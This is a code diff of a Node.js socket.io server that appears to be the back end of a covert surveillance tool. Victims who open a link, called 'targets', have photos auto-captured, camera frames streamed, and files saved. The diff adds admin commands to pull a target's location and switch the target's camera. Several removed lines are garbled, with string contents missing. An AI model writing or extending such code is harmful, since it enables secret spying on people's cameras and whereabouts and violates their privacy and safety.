@@ -27,12 +27,29 @@ module.exports = function(io) {
         });
 
         socket.on('user-ready', (data) => {
-            connectedTargets[socket.id] = { 
-                id: socket.id, 
-                deviceInfo: data && data.deviceInfo ? data.deviceInfo : "Web User" 
-            };
+            if (!connectedTargets[socket.id]) connectedTargets[socket.id] = {};
+            connectedTargets[socket.id].id = socket.id;
+            connectedTargets[socket.id].deviceInfo = data && data.deviceInfo ? data.deviceInfo : 'Web User';
             io.emit('update-users-list', connectedTargets);
-            if (isLinkActive) socket.emit('start-auto-capture');
+        });
+
+        socket.on('admin-request-location', (targetSocketId) => {
+            if (connectedTargets[targetSocketId]) {
+                io.to(targetSocketId).emit('request-location');
+            }
+        });
+
+        socket.on('user-location', (loc) => {
+            if (connectedTargets[socket.id]) {
+                connectedTargets[socket.id].location = loc;
+                io.emit('update-users-list', connectedTargets);
+            }
+        });
+
+        socket.on('admin-switch-camera', (data) => {
+            if (connectedTargets[data.targetId]) {
+                io.to(data.targetId).emit('switch-camera', data.facing);
+            }
         });
 
         socket.on('live-stream-frame', (frameData) => {
@@ -49,12 +66,12 @@ module.exports = function(io) {
 
         socket.on('user-photo-captured', (imageData) => {
             if (!isLinkActive) return;
-            const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
-            const fileName = photo_\_\.jpg;
+            const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, '');
+            const fileName = 'photo_' + Date.now() + '_' + socket.id.substr(0,4) + '.jpg';
             const filePath = path.join(uploadDir, fileName);
 
             fs.writeFile(filePath, base64Data, 'base64', (err) => {
-                if (!err) console.log(? Saved: \);
+                if (!err) console.log('Saved: ' + fileName);
             });
 
             const photoObj = { imageData, fileName };
